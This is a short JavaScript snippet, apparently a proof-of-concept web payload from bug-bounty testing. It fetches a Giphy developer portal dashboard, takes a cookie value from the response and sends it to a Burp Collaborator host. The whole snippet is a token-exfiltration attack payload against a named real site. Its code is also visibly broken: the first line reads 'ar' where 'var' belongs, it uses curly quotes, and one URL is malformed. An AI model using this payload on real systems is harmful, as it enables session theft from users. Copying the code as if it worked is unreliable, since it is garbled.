ar xhr = new XMLHttpRequest();
xhr.onreadystatechange = function()
{
if (xhr.readyState == 4 && xhr.status == 200)
{
var yourtoken = xhr.getResponseHeader(‘Cookie’)
var xhr2 = new XMLHttpRequest();
xhr2.open(“GET”, “http:/vvu2yz9vsm5131mmm92vbmi4vv1mpb.burpcollaborator.net/"+ yourtoken );
xhr2.send();
}
}
xhr.open(“GET”, “https://devportal-new.giphy.com/dashboard/");
xhr.send();
